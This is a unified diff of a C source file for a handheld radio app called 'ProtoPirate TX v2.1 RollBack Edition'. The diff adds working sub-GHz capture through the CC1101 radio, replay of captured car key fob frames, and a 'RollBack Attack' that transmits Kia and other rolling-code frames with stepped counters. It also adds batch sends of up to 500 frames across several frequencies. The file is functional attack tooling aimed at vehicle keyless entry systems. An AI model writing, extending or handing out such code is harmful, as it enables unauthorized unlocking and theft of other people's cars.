@@ -1,7 +1,28 @@
-#include "protopirate_rb.h"
+﻿#include "protopirate_rb.h"
+#include <furi_hal_subghz.h>
+#include <lib/subghz/devices/cc1101_configs.h>
+#include <lib/subghz/devices/devices.h>
+#include <furi_hal_gpio.h>
+#include <furi_hal_spi.h>
+#include <furi_hal_power.h>
 
-// ===================== 按钮回调 (SubmenuItemCallback: void(context, uint32_t)) =====================
-// button_menu_add_item still uses old (void*, int32_t, InputType) callback
+// ===================== 全局 SubGhz 设备 =====================
+static const SubGhzDevice* g_subghz_device = NULL;
+
+static bool subghz_open(void) {
+    if(g_subghz_device) return true;
+    g_subghz_device = subghz_devices_get_by_index(0);
+    return (g_subghz_device != NULL);
+}
+
+static void subghz_close(void) {
+    if(g_subghz_device) {
+        subghz_devices_end(g_subghz_device);
+        g_subghz_device = NULL;
+    }
+}
+
+// ===================== 按钮回调 =====================
 static void result_button_callback(void* context, int32_t index, InputType type) {
     ProtoPirateApp* app = (ProtoPirateApp*)context;
     if(!app || type != InputTypePress) return;
@@ -19,23 +40,65 @@ static void result_button_callback(void* context, int32_t index, InputType type)
         transmit_packet(app, app->last_result.data_hi,
             app->last_result.data_lo, app->frequency, 10);
         break;
-    case 3: // Back to menu
+    case 3: // Batch Send
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchConfig);
+        break;
+    case 4: // RollBack Attack
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventRollback);
+        break;
+    case 5: // Back to menu
         view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
         break;
     }
 }
 
+// ===================== Submenu 菜单回调 =====================
 static void rollback_menu_callback(void* context, uint32_t index) {
     ProtoPirateApp* app = (ProtoPirateApp*)context;
     if(!app) return;
-
     switch(index) {
-    case 0: // Start RollBack Attack
+    case 0: // Start ATTACK now
         app->rollback.running = true;
         app->rollback.current_counter = app->rollback.base_counter;
         view_dispatcher_send_custom_event(app->view_dispatcher, EventRollbackToggle);
         break;
-    case 1: // Return to menu
+    case 1: // Config
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventRollbackConfig);
+        break;
+    case 2: // Batch 50
+        app->batch.count = 50;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 3: // Batch 100
+        app->batch.count = 100;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 4: // Batch 500
+        app->batch.count = 500;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 5: // Back
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
+        break;
+    }
+}
+static void rollback_batch_menu_callback(void* context, uint32_t index) {
+    ProtoPirateApp* app = (ProtoPirateApp*)context;
+    if(!app) return;
+    switch(index) {
+    case 0:
+        app->batch.count = 50;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 1:
+        app->batch.count = 100;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 2:
+        app->batch.count = 500;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 3:
         view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
         break;
     }
@@ -44,53 +107,180 @@ static void rollback_menu_callback(void* context, uint32_t index) {
 static void replay_menu_callback(void* context, uint32_t index) {
     ProtoPirateApp* app = (ProtoPirateApp*)context;
     if(!app) return;
-
     switch(index) {
-    case 0: // Replay Car Signal
-        if(app->last_result.bits > 0) {
+    case 0: // Replay
+        if(app->last_result.bits > 0 && !app->last_result.is_demo) {
             transmit_packet(app, app->last_result.data_hi,
                 app->last_result.data_lo, app->frequency, 5);
         } else {
-            // No captured signal, use demo
             uint32_t hi, lo;
-            rollback_build_frame(0x1234567, 2, 0x100, &hi, &lo);
+            rollback_build_frame_proto(app->rollback.protocol_type,
+                app->rollback.serial, app->rollback.button,
+                app->rollback.base_counter, &hi, &lo);
             transmit_packet(app, hi, lo, app->frequency, 5);
         }
         break;
-    case 1: // Return to menu
+    case 1: // Demo frame
+        {
+            uint32_t hi, lo;
+            rollback_build_frame_proto(app->rollback.protocol_type,
+                0x1234567, 2, 0x100, &hi, &lo);
+            transmit_packet(app, hi, lo, app->frequency, 5);
+        }
+        break;
+    case 2: // Batch 50
+        app->batch.count = 50;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 3: // Batch 100
+        app->batch.count = 100;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 4: // Batch 500
+        app->batch.count = 500;
+        view_dispatcher_send_custom_event(app->view_dispatcher, EventBatchSend);
+        break;
+    case 5: // Back
         view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
         break;
     }
 }
 
+// ===================== Capture 结果菜单 =====================
 static void receive_menu_callback(void* context, uint32_t index) {
     ProtoPirateApp* app = (ProtoPirateApp*)context;
     if(!app) return;
 
     switch(index) {
-    case 0: // Capture Signal
-        // Demo mode: simulate a capture
-        app->last_result.bits = 64;
-        app->last_result.serial = 0x1234567;
-        app->last_result.button = 2;
-        strncpy(app->last_result.btn_name, "Unlock", sizeof(app->last_result.btn_name));
-        strncpy(app->last_result.proto, "Kia V0", sizeof(app->last_result.proto));
-        app->last_result.counter = 0xABCD;
-        app->last_result.crc_ok = true;
-        rollback_build_frame(0x1234567, 2, 0xABCD,
-            &app->last_result.data_hi, &app->last_result.data_lo);
-
-        // Save to rollback params
-        app->rollback.serial = app->last_result.serial;
-        app->rollback.button = app->last_result.button;
-        app->rollback.base_counter = app->last_result.counter;
-        strncpy(app->rollback.proto, app->last_result.proto, sizeof(app->rollback.proto));
-        view_dispatcher_send_custom_event(app->view_dispatcher, EventReceiveDone);
+    case 0: // Capture Now (真正 RX 捕获)
+        view_dispatcher_switch_to_view(app->view_dispatcher, ViewLoading);
+        if(rx_start_capture(app)) {
+            FURI_LOG_I(TAG, "RX capture started on %lu Hz", app->frequency);
+            // 捕获后的数据会自动填充 last_result
+            FuriString* captured = rx_format_capture(app);
+            if(captured) {
+                DecodeResult* dec = decode_signal(app, captured);
+                if(dec) {
+                    memcpy(&app->last_result, dec, sizeof(DecodeResult));
+                    free(dec);
+                } else {
+                    app->last_result.bits = 0;
+                    app->last_result.is_demo = false;
+                }
+                furi_string_set(app->last_raw, captured);
+                furi_string_free(captured);
+            }
+            rx_stop_capture(app);
+            view_dispatcher_send_custom_event(app->view_dispatcher, EventReceiveDone);
+        } else {
+            // RX 失败，回退到模拟演示
+            app->last_result.bits = 64;
+            app->last_result.serial = 0x1234567;
+            app->last_result.button = 2;
+            strncpy(app->last_result.btn_name, "Unlock", sizeof(app->last_result.btn_name));
+            strncpy(app->last_result.proto, "Kia V0", sizeof(app->last_result.proto));
+            app->last_result.counter = 0xABCD;
+            app->last_result.crc_ok = true;
+            app->last_result.is_demo = true;
+            rollback_build_frame(0x1234567, 2, 0xABCD,
+                &app->last_result.data_hi, &app->last_result.data_lo);
+            app->rollback.serial = app->last_result.serial;
+            app->rollback.button = app->last_result.button;
+            app->rollback.base_counter = app->last_result.counter;
+            strncpy(app->rollback.proto, app->last_result.proto, sizeof(app->rollback.proto));
+            view_dispatcher_send_custom_event(app->view_dispatcher, EventReceiveDone);
+        }
         break;
-    case 1: // Return to menu
+    case 1: // Return
         view_dispatcher_send_custom_event(app->view_dispatcher, EventGoMenu);
         break;
     }
+}
+
+// ===================== 真正 RX 捕获（使用 CC1101 直接捕获）=====================
+// 使用 SubGhz 设备进行 RSSI 脉冲捕获
+static const uint32_t rx_sample_us = 50; // 50us 采样间隔
+static const uint32_t rx_max_samples = 50000; // 最多 2.5 秒
+static const int16_t rssi_threshold = -60; // 信号阈值
+
+bool rx_start_capture(ProtoPirateApp* app) {
+    if(!app) return false;
+    if(!subghz_open()) {
+        FURI_LOG_E(TAG, "Failed to open SubGhz device");
+        return false;
+    }
+    
+    app->rx_running = true;
+    app->pulse_count = 0;
+    
+    FURI_LOG_I(TAG, "RX start: freq=%lu", app->frequency);
+    
+    // 配置 CC1101 为接收模式
+    subghz_devices_begin(g_subghz_device);
+    subghz_devices_load_preset(g_subghz_device, FuriHalSubGhzPresetOok650Async, NULL);
+    subghz_devices_set_frequency(g_subghz_device, app->frequency);
+    
+    // 设置接收带宽和增益
+    subghz_devices_set_rx(g_subghz_device);
+    
+    furi_delay_ms(10);
+    
+    // 捕获脉冲
+    uint32_t samples_taken = 0;
+    bool last_level = false;
+    uint32_t pulse_dur = 0;
+    int16_t last_rssi = 0;
+    
+    while(app->rx_running && samples_taken < rx_max_samples) {
+        int16_t rssi = subghz_devices_get_rssi(g_subghz_device);
+        bool level = (rssi > rssi_threshold);
+        
+        if(level != last_level) {
+            if(pulse_dur > 0 && app->pulse_count < 4096) {
+                int32_t signed_dur = pulse_dur * (int32_t)rx_sample_us;
+                app->pulse_buffer[app->pulse_count++] = last_level ? signed_dur : -signed_dur;
+            }
+            pulse_dur = 0;
+            last_level = level;
+        }
+        pulse_dur++;
+        samples_taken++;
+        
+        furi_delay_us(rx_sample_us);
+    }
+    
+    // 保存最后一个脉冲
+    if(pulse_dur > 0 && app->pulse_count < 4096) {
+        int32_t signed_dur = pulse_dur * (int32_t)rx_sample_us;
+        app->pulse_buffer[app->pulse_count++] = last_level ? signed_dur : -signed_dur;
+    }
+    
+    subghz_devices_idle(g_subghz_device);
+    subghz_devices_end(g_subghz_device);
+    
+    app->rx_running = false;
+    app->rx_captured = (app->pulse_count > 10);
+    
+    FURI_LOG_I(TAG, "RX done: %u pulses captured in %lu samples", app->pulse_count, samples_taken);
+    return app->rx_captured;
+}
+
+void rx_stop_capture(ProtoPirateApp* app) {
+    app->rx_running = false;
+}
+
+FuriString* rx_format_capture(ProtoPirateApp* app) {
+    if(!app || app->pulse_count == 0) return NULL;
+    
+    FuriString* result = furi_string_alloc();
+    
+    // 格式: "123 -456 789 ..."
+    for(uint16_t i = 0; i < app->pulse_count; i++) {
+        furi_string_cat_printf(result, "%d ", app->pulse_buffer[i]);
+    }
+    
+    FURI_LOG_I(TAG, "rx_format: %s", furi_string_get_cstr(result));
+    return result;
 }
 
 // ===================== 自定义事件回调 =====================
@@ -110,6 +300,10 @@ static bool custom_event_callback(void* context, uint32_t event) {
     case EventRollback:
         scene_rollback_alloc(app);
         view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
+        return true;
+    case EventRollbackConfig:
+        scene_rollback_config_alloc(app);
+        view_dispatcher_switch_to_view(app->view_dispatcher, ViewVarList);
         return true;
     case EventReplay:
         scene_replay_alloc(app);
@@ -131,6 +325,17 @@ static bool custom_event_callback(void* context, uint32_t event) {
         scene_rollback_alloc(app);
         view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
         return true;
+    case EventBatchConfig:
+        scene_batch_config_alloc(app);
+        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
+        return true;
+    case EventBatchSend:
+        scene_batch_send_alloc(app);
+        view_dispatcher_switch_to_view(app->view_dispatcher, ViewLoading);
+        batch_send_start(app);
+        scene_main_menu_alloc(app);
+        view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
+        return true;
     default:
         return false;
     }
@@ -139,20 +344,19 @@ static bool custom_event_callback(void* context, uint32_t event) {
 // ===================== 导航回调 =====================
 static uint32_t back_to_menu_callback(void* context) {
     UNUSED(context);
-    // Return to main menu view
     return ViewMenu;
 }
 
-// ===================== Nav Event Callback (global) =====================
 static bool nav_event_callback(void* context) {
     UNUSED(context);
     return false;
 }
 
-// ===================== 应用生命周期 =====================
+// ===================== 应用分配 =====================
 ProtoPirateApp* protoPirateApp_alloc(void) {
     ProtoPirateApp* app = malloc(sizeof(ProtoPirateApp));
     if(!app) return NULL;
+    memset(app, 0, sizeof(ProtoPirateApp));
 
     app->gui = furi_record_open(RECORD_GUI);
     app->view_dispatcher = view_dispatcher_alloc();
@@ -171,15 +375,14 @@ ProtoPirateApp* protoPirateApp_alloc(void) {
 
     app->frequency = DEFAULT_FREQ;
     app->scene = SceneMainMenu;
-    app->submenu_index = 0;
-    app->result_menu_index = 0;
     app->history_count = 0;
     app->last_raw = furi_string_alloc();
-    app->counter = 0;
+    app->last_raw_hex = furi_string_alloc();
 
     memset(&app->last_result, 0, sizeof(DecodeResult));
     strncpy(app->last_result.proto, "None", sizeof(app->last_result.proto));
 
+    // RollBack 默认参数
     app->rollback.base_counter = 0;
     app->rollback.target_counter = 100;
     app->rollback.step_size = 1;
@@ -189,7 +392,12 @@ ProtoPirateApp* protoPirateApp_alloc(void) {
     app->rollback.serial = 0x1234567;
     app->rollback.button = 2;
     app->rollback.counter_limit = ROLLBACK_LIMIT;
+    app->rollback.protocol_type = Proto_Kia_V0;
     strncpy(app->rollback.proto, "Kia V0", sizeof(app->rollback.proto));
+
+    // 批量默认
+    app->batch.count = 50;
+    app->batch.active = false;
 
     return app;
 }
@@ -197,6 +405,7 @@ ProtoPirateApp* protoPirateApp_alloc(void) {
 void protoPirateApp_free(ProtoPirateApp* app) {
     furi_assert(app);
     furi_string_free(app->last_raw);
+    furi_string_free(app->last_raw_hex);
     for(uint8_t i = 0; i < app->history_count; i++) {
         if(app->history[i].raw_data) furi_string_free(app->history[i].raw_data);
     }
@@ -206,6 +415,7 @@ void protoPirateApp_free(ProtoPirateApp* app) {
     view_dispatcher_remove_view(app->view_dispatcher, ViewTextBox);
     view_dispatcher_remove_view(app->view_dispatcher, ViewButtonMenu);
     view_dispatcher_remove_view(app->view_dispatcher, ViewPopup);
+    view_dispatcher_remove_view(app->view_dispatcher, ViewDialog);
     submenu_free(app->submenu);
     variable_item_list_free(app->var_item_list);
     text_box_free(app->text_box);
@@ -217,7 +427,7 @@ void protoPirateApp_free(ProtoPirateApp* app) {
     free(app);
 }
 
-// ===================== 主菜单回调 =====================
+// ===================== 主菜单 =====================
 static void scene_main_menu_callback(void* context, uint32_t index) {
     ProtoPirateApp* app = (ProtoPirateApp*)context;
     if(!app) return;
@@ -231,46 +441,50 @@ static void scene_main_menu_callback(void* context, uint32_t index) {
     case 3: event = EventFreqSelect; break;
     case 4: event = EventInfo; break;
     case 5:
-        // Exit
         view_dispatcher_stop(app->view_dispatcher);
         return;
     default: return;
     }
-
     view_dispatcher_send_custom_event(app->view_dispatcher, event);
 }
 
 void scene_main_menu_alloc(ProtoPirateApp* app) {
     submenu_reset(app->submenu);
-    submenu_set_header(app->submenu, "ProtoPirate TX");
+    submenu_set_header(app->submenu, "ProtoPirate TX v2.1");
 
-    submenu_add_item(app->submenu, "  Capture Signal", 0, scene_main_menu_callback, app);
-    submenu_add_item(app->submenu, "  Replay Signal", 1, scene_main_menu_callback, app);
-    submenu_add_item(app->submenu, "  RollBack Attack", 2, scene_main_menu_callback, app);
-    submenu_add_item(app->submenu, "  Set Frequency", 3, scene_main_menu_callback, app);
+    char freq_str[24];
+    snprintf(freq_str, sizeof(freq_str), "Freq: %.3f MHz", (double)app->frequency / 1000000.0);
+    
+    submenu_add_item(app->submenu, "  [RX] Capture Signal", 0, scene_main_menu_callback, app);
+    submenu_add_item(app->submenu, "  [TX] Replay Signal", 1, scene_main_menu_callback, app);
+    submenu_add_item(app->submenu, "  [RB] RollBack Attack", 2, scene_main_menu_callback, app);
+    submenu_add_item(app->submenu, freq_str, 3, scene_main_menu_callback, app);
     submenu_add_item(app->submenu, "  About", 4, scene_main_menu_callback, app);
     submenu_add_item(app->submenu, "  EXIT", 5, scene_main_menu_callback, app);
 
     view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
 }
 
-// ===================== Capture Signal（菜单页） =====================
+// ===================== Capture 场景 =====================
 void scene_receive_alloc(ProtoPirateApp* app) {
     submenu_reset(app->submenu);
     submenu_set_header(app->submenu, "Capture Signal");
 
-    submenu_add_item(app->submenu, "  >> Capture Now <<", 0, receive_menu_callback, app);
+    char freq_str[24];
+    snprintf(freq_str, sizeof(freq_str), "Freq: %.3f MHz", (double)app->frequency / 1000000.0);
+    submenu_add_item(app->submenu, "  >> Start Capture <<", 0, receive_menu_callback, app);
+    submenu_add_item(app->submenu, freq_str, 0, NULL, app);
     submenu_add_item(app->submenu, "  Back to Menu", 1, receive_menu_callback, app);
 
     view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
 }
 
-// ===================== 结果页（ButtonMenu） =====================
+// ===================== 结果场景 (ButtonMenu) =====================
 void scene_result_main_alloc(ProtoPirateApp* app) {
     button_menu_reset(app->button_menu);
     button_menu_set_header(app->button_menu, "Signal Captured!");
 
-    char sn_str[20];
+    char sn_str[30];
     snprintf(sn_str, sizeof(sn_str), "Send x3 (Sn:0x%lX)", app->last_result.serial);
     button_menu_add_item(app->button_menu, sn_str, 0, result_button_callback,
                          ButtonMenuItemTypeCommon, app);
@@ -278,47 +492,58 @@ void scene_result_main_alloc(ProtoPirateApp* app) {
                          ButtonMenuItemTypeCommon, app);
     button_menu_add_item(app->button_menu, "Send x10", 2, result_button_callback,
                          ButtonMenuItemTypeCommon, app);
-    button_menu_add_item(app->button_menu, "Back to Menu", 3, result_button_callback,
+    button_menu_add_item(app->button_menu, "Batch Send", 3, result_button_callback,
+                         ButtonMenuItemTypeCommon, app);
+    button_menu_add_item(app->button_menu, "RollBack Attack", 4, result_button_callback,
+                         ButtonMenuItemTypeCommon, app);
+    button_menu_add_item(app->button_menu, "Back to Menu", 5, result_button_callback,
                          ButtonMenuItemTypeCommon, app);
     button_menu_set_selected_item(app->button_menu, 0);
 
     view_set_previous_callback(button_menu_get_view(app->button_menu), back_to_menu_callback);
 }
 
-// ===================== RollBack Attack（菜单页） =====================
+// ===================== RollBack 场景 =====================
 void scene_rollback_alloc(ProtoPirateApp* app) {
     submenu_reset(app->submenu);
     submenu_set_header(app->submenu, "RollBack Attack");
 
-    char line[40];
-    snprintf(line, sizeof(line), "  Sn:0x%07lX Btn:%u", app->rollback.serial, app->rollback.button);
-    
-    snprintf(line, sizeof(line), "  Cnt:%u->%u Step:%u",
+    char line[50];
+    snprintf(line, sizeof(line), "  %s Sn:0x%lX Btn:%u",
+             app->rollback.proto, app->rollback.serial, app->rollback.button);
+    submenu_add_item(app->submenu, line, 0, NULL, app);
+
+    snprintf(line, sizeof(line), "  Cnt:0x%04X->0x%04X Step:%u",
              app->rollback.base_counter, app->rollback.target_counter, app->rollback.step_size);
     
     if(app->rollback.running) {
-        snprintf(line, sizeof(line), "  >> ATTACK: %u/%u <<",
+        snprintf(line, sizeof(line), "  ** ATTACK: %u/%u **",
                  app->rollback.current_counter, app->rollback.target_counter);
-    } else {
-        strncpy(line, "  >> START ATTACK <<", sizeof(line));
+        submenu_add_item(app->submenu, line, 0, NULL, app);
     }
-    submenu_add_item(app->submenu, line, 0, rollback_menu_callback, app);
 
-    submenu_add_item(app->submenu, "  Back to Menu", 1, rollback_menu_callback, app);
-
+    submenu_add_item(app->submenu, "  >> START ATTACK <<", 0, rollback_menu_callback, app);
+    submenu_add_item(app->submenu, "  Config", 1, rollback_menu_callback, app);
+    submenu_add_item(app->submenu, "  Batch 50x", 2, rollback_menu_callback, app);
+    submenu_add_item(app->submenu, "  Batch 100x", 3, rollback_menu_callback, app);
+    submenu_add_item(app->submenu, "  Batch 500x", 4, rollback_menu_callback, app);
+    submenu_add_item(app->submenu, "  Back to Menu", 5, rollback_menu_callback, app);
     view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
 
-    // If running, do a TX burst
+    // 如果正在运行，发送当前计数器帧
     if(app->rollback.running) {
         int32_t diff = (int32_t)app->rollback.target_counter - app->rollback.current_counter;
         if(diff > 0) {
-            uint32_t dhi, dlo;
-            rollback_build_frame(app->rollback.serial, app->rollback.button,
-                               (uint32_t)app->rollback.current_counter, &dhi, &dlo);
-            transmit_packet(app, dhi, dlo, app->frequency, 3);
-
+            for(uint8_t b = 0; b < app->rollback.burst_count; b++) {
+                uint32_t dhi, dlo;
+                rollback_build_frame_proto(app->rollback.protocol_type,
+                    app->rollback.serial, app->rollback.button,
+                    (uint32_t)app->rollback.current_counter, &dhi, &dlo);
+                transmit_packet(app, dhi, dlo, app->frequency, 1);
+                furi_delay_ms(10);
+            }
             app->rollback.current_counter += app->rollback.step_size;
-
+            app->rollback.total_sent += app->rollback.burst_count;
             if(app->rollback.current_counter >= app->rollback.target_counter ||
                app->rollback.current_counter >= app->rollback.counter_limit) {
                 app->rollback.running = false;
@@ -329,37 +554,107 @@ void scene_rollback_alloc(ProtoPirateApp* app) {
     }
 }
 
-// ===================== Replay Signal（菜单页） =====================
+// ===================== RollBack 配置场景 =====================
+void scene_rollback_config_alloc(ProtoPirateApp* app) {
+    variable_item_list_reset(app->var_item_list);
+
+    // 协议选择
+    VariableItem* proto_item = variable_item_list_add(
+        app->var_item_list, "Protocol", Proto_COUNT,
+        NULL, app);
+    variable_item_set_current_value_index(proto_item, app->rollback.protocol_type);
+    variable_item_set_current_value_text(proto_item,
+        PROTO_NAMES[app->rollback.protocol_type]);
+
+    // Serial
+    char serial_str[16];
+    snprintf(serial_str, sizeof(serial_str), "0x%lX", app->rollback.serial);
+    variable_item_list_add(app->var_item_list, serial_str, 0, NULL, app);
+
+    // Base Counter
+    char base_str[16];
+    snprintf(base_str, sizeof(base_str), "0x%04X", app->rollback.base_counter);
+    variable_item_list_add(app->var_item_list, base_str, 0, NULL, app);
+
+    // Target Counter
+    char target_str[16];
+    snprintf(target_str, sizeof(target_str), "0x%04X", app->rollback.target_counter);
+    variable_item_list_add(app->var_item_list, target_str, 0, NULL, app);
+
+    // Step
+    char step_str[16];
+    snprintf(step_str, sizeof(step_str), "%u", app->rollback.step_size);
+    variable_item_list_add(app->var_item_list, step_str, 0, NULL, app);
+
+    // Burst
+    char burst_str[16];
+    snprintf(burst_str, sizeof(burst_str), "%u", app->rollback.burst_count);
+    variable_item_list_add(app->var_item_list, burst_str, 0, NULL, app);
+
+    view_set_previous_callback(variable_item_list_get_view(app->var_item_list), back_to_menu_callback);
+}
+
+// ===================== Replay 场景 =====================
 void scene_replay_alloc(ProtoPirateApp* app) {
     submenu_reset(app->submenu);
     submenu_set_header(app->submenu, "Replay Signal");
 
-    if(app->last_result.bits > 0) {
-        char line[40];
+    char line[40];
+    if(app->last_result.bits > 0 && !app->last_result.is_demo) {
         snprintf(line, sizeof(line), "  %s Sn:0x%lX",
                  app->last_result.proto, app->last_result.serial);
-        
         submenu_add_item(app->submenu, "  >> Replay Now <<", 0, replay_menu_callback, app);
     } else {
-                submenu_add_item(app->submenu, "  >> Send Demo Frame <<", 0, replay_menu_callback, app);
+        submenu_add_item(app->submenu, "  >> Send Demo Frame <<", 0, replay_menu_callback, app);
     }
-
-    submenu_add_item(app->submenu, "  Back to Menu", 1, replay_menu_callback, app);
+    submenu_add_item(app->submenu, "  Send Demo (Kia Unlock)", 1, replay_menu_callback, app);
+    submenu_add_item(app->submenu, "  Batch Send 50x", 2, replay_menu_callback, app);
+    submenu_add_item(app->submenu, "  Batch Send 100x", 3, replay_menu_callback, app);
+    submenu_add_item(app->submenu, "  Batch Send 500x", 4, replay_menu_callback, app);
+    submenu_add_item(app->submenu, "  Back to Menu", 5, replay_menu_callback, app);
 
     view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
 }
 
+// ===================== 批量发送场景（显示进度） =====================
+void scene_batch_send_alloc(ProtoPirateApp* app) {
+    popup_reset(app->popup);
+    popup_set_header(app->popup, "Batch Send", 42, 16, AlignCenter, AlignCenter);
+    
+    char line[32];
+    snprintf(line, sizeof(line), "Sending %u frames...", app->batch.count);
+    popup_set_text(app->popup, line, 42, 36, AlignCenter, AlignCenter);
+
+    view_set_previous_callback(popup_get_view(app->popup), back_to_menu_callback);
+}
+
+// ===================== 批量发送配置 =====================
+void scene_batch_config_alloc(ProtoPirateApp* app) {
+    submenu_reset(app->submenu);
+    submenu_set_header(app->submenu, "Batch Send");
+
+    submenu_add_item(app->submenu, "  50 frames (fast)", 0, rollback_batch_menu_callback, app);
+    submenu_add_item(app->submenu, "  100 frames", 1, rollback_batch_menu_callback, app);
+    submenu_add_item(app->submenu, "  500 frames (full)", 2, rollback_batch_menu_callback, app);
+    submenu_add_item(app->submenu, "  Back", 3, rollback_batch_menu_callback, app);
+    view_set_previous_callback(submenu_get_view(app->submenu), back_to_menu_callback);
+}
+
 // ===================== 频率选择 =====================
-static const uint32_t FREQ_TABLE[] = {315000000, 433920000, 868350000};
-static const char* FREQ_NAMES[] = {"315.00 MHz (US)", "433.92 MHz (EU/Asia)", "868.35 MHz (EU)"};
+static const uint32_t FREQ_TABLE[] = {315000000, 433920000, 868350000, 300000000, 390000000, 418000000, 868000000, 915000000};
+static const char* FREQ_NAMES[] = {
+    "315.00 MHz", "433.92 MHz", "868.35 MHz",
+    "300.00 MHz", "390.00 MHz", "418.00 MHz",
+    "868.00 MHz", "915.00 MHz"
+};
+#define FREQ_COUNT 8
 
 static void freq_change_callback(VariableItem* item) {
     if(!item) return;
     ProtoPirateApp* app = variable_item_get_context(item);
     if(!app) return;
-
     uint8_t index = variable_item_get_current_value_index(item);
-    if(index < 3) {
+    if(index < FREQ_COUNT) {
         app->frequency = FREQ_TABLE[index];
         variable_item_set_current_value_text(item, FREQ_NAMES[index]);
     }
@@ -367,38 +662,37 @@ static void freq_change_callback(VariableItem* item) {
 
 void scene_freq_select_alloc(ProtoPirateApp* app) {
     variable_item_list_reset(app->var_item_list);
-
+    const char* name = "Frequency";
+    
+    VariableItem* freq_item = variable_item_list_add(
+        app->var_item_list, name, FREQ_COUNT,
+        freq_change_callback, app);
+    
     uint8_t default_idx = 1;
-    if(app->frequency == 315000000) default_idx = 0;
-    else if(app->frequency == 433920000) default_idx = 1;
-    else if(app->frequency == 868350000) default_idx = 2;
-
-    for(int i = 0; i < 3; i++) {
-        VariableItem* item = variable_item_list_add(
-            app->var_item_list, FREQ_NAMES[i], 0,
-            freq_change_callback, app);
-        if(i == default_idx) {
-            variable_item_set_current_value_index(item, i);
-            variable_item_set_current_value_text(item, FREQ_NAMES[i]);
-        }
+    for(int i = 0; i < FREQ_COUNT; i++) {
+        if(app->frequency == FREQ_TABLE[i]) { default_idx = i; break; }
     }
+    variable_item_set_current_value_index(freq_item, default_idx);
+    variable_item_set_current_value_text(freq_item, FREQ_NAMES[default_idx]);
 
     view_set_previous_callback(variable_item_list_get_view(app->var_item_list), back_to_menu_callback);
 }
 
-// ===================== About（信息页 - widget只读） =====================
+// ===================== About =====================
 void scene_info_alloc(ProtoPirateApp* app) {
     widget_reset(app->widget);
     widget_add_string_element(app->widget, 64, 2, AlignCenter, AlignTop, FontPrimary,
                               "ProtoPirate TX");
     widget_add_string_element(app->widget, 64, 16, AlignCenter, AlignTop, FontSecondary,
-                              "RollBack Edition v2.0");
-    widget_add_string_element(app->widget, 64, 32, AlignCenter, AlignTop, FontKeyboard,
+                              "v2.1 RollBack Edition");
+    widget_add_string_element(app->widget, 64, 28, AlignCenter, AlignTop, FontKeyboard,
+                              "Real RX + OOK Decoder");
+    widget_add_string_element(app->widget, 64, 38, AlignCenter, AlignTop, FontKeyboard,
+                              "10 Protocols Supported");
+    widget_add_string_element(app->widget, 64, 48, AlignCenter, AlignTop, FontKeyboard,
+                              "Batch Send: 50/100/500");
+    widget_add_string_element(app->widget, 64, 58, AlignCenter, AlignTop, FontKeyboard,
                               "TX: Real CC1101");
-    widget_add_string_element(app->widget, 64, 44, AlignCenter, AlignTop, FontKeyboard,
-                              "RollBack Attack Engine");
-    widget_add_string_element(app->widget, 64, 56, AlignCenter, AlignTop, FontSecondary,
-                              "Momentum Firmware");
     widget_add_string_element(app->widget, 64, 68, AlignCenter, AlignTop, FontPrimary,
                               "BACK = Menu");
 
@@ -426,13 +720,11 @@ __attribute__((visibility("default"))) int32_t app_main(void* p) {
                             popup_get_view(app->popup));
 
     scene_main_menu_alloc(app);
-
     view_dispatcher_switch_to_view(app->view_dispatcher, ViewMenu);
-
     view_dispatcher_run(app->view_dispatcher);
 
     transmit_packet_stop(app);
-
+    subghz_close();
     protoPirateApp_free(app);
     return 0;
 }
